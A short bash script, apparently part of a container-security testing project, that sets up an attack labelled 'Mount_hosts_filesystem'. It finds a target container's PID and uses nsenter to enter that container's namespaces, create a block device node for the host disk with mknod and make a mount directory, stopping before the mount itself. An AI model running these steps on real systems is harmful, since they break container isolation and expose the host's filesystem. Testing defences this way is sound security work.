#!/bin/bash

attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

docker ps | grep attacked_nsenter > dockerps
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
major=$(cat major_num)
minor=$(cat minor_num)
dev="/dev/$(cat sdev_of_fs)"

#Done by attacker inside host
nsenter --target ${container_pid} --mount --pid mknod --mode 0600 ${dev} b ${major} ${minor}
nsenter --target ${container_pid} --mount --pid mkdir -p /tmpmount
